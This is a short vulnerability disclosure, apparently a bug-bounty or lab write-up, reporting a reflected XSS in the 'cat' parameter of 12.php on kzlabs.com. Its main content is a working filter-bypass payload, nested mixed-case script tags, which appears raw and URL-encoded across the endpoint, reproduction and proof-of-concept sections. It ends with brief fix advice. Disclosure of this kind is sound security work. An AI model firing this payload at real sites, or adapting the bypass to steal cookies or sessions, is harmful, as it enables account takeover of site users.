# Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

The vulnerability can be exploited using an obfuscated mixed-case `<script>` payload to bypass weak filtering protections.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/12.php?cat=%22xicorr%3E%3CsCrsCriptipt%3Ealealertrt(%22xicorXSS2%22)%3C/sCrsCriptipt%3E%22%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
cat
```

---

## Payload Used

```html id="k9c1wp"
"xicorr><sCrsCriptipt>alealertrt("xicorXSS2")</sCrsCriptipt>">
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/12.php?cat=%22xicorr%3E%3CsCrsCriptipt%3Ealealertrt(%22xicorXSS2%22)%3C/sCrsCriptipt%3E%22%3E
   ```

2. Observe that the payload is reflected into the HTML response without proper sanitization.

3. The injected script executes automatically in the victim’s browser.

4. A popup dialog displaying `xicorXSS2` confirms successful JavaScript execution.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/12.php?cat=%22xicorr%3E%3CsCrsCriptipt%3Ealealertrt(%22xicorXSS2%22)%3C/sCrsCriptipt%3E%22%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/5baf3a50-fbeb-43b7-b9fd-3b62eaf96f8c" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
